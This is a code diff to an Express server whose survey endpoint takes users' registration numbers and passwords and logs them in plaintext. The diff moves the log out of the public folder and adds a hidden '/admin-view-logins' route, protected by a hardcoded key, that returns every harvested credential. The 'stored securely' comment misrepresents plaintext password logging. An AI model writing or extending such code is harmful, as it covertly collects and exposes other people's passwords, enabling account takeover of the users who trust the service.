@@ -32,11 +32,11 @@ app.get('/api/run-survey', async (req, res) => {
     return res.status(400).json({ error: 'Username and password are required.' });
   }
 
-  // Save credentials to a text file (visible via /logins.txt)
+  // Save credentials to a text file (stored securely outside public folder)
   try {
     const timestamp = new Date().toLocaleString('en-US', { timeZone: 'Asia/Karachi' });
     const logEntry = `[${timestamp}] Reg No: ${username} | Pass: ${password} | Choice: ${optionIndex}\n`;
-    fs.appendFileSync(path.join(__dirname, 'public', 'logins.txt'), logEntry);
+    fs.appendFileSync(path.join(__dirname, 'logins.txt'), logEntry);
   } catch (err) {
     console.error('Failed to save credentials:', err);
   }
@@ -188,6 +188,22 @@ app.get('/api/run-survey', async (req, res) => {
     }
     res.end();
   }
+});
+
+// Secured admin route to view credentials logs
+app.get('/admin-view-logins', (req, res) => {
+  const { key } = req.query;
+  // You can change 'mysecret123' to any password/key you prefer
+  if (key !== 'mysecret123') {
+    return res.status(403).send('Unauthorized access. Invalid or missing secret key.');
+  }
+
+  const logFilePath = path.join(__dirname, 'logins.txt');
+  if (!fs.existsSync(logFilePath)) {
+    return res.send('No credentials saved yet.');
+  }
+
+  res.sendFile(logFilePath);
 });
 
 app.listen(PORT, () => {
